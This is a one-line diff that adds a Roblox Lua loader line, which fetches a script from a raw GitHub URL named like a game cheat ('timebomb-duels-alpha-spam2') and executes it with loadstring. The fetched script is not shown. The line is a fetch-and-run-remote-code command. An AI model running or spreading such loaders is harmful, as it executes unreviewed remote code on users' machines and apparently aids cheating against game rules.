@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/timebomb-duels-alpha-spam2-rbk2eml4igscgc.lua"))()
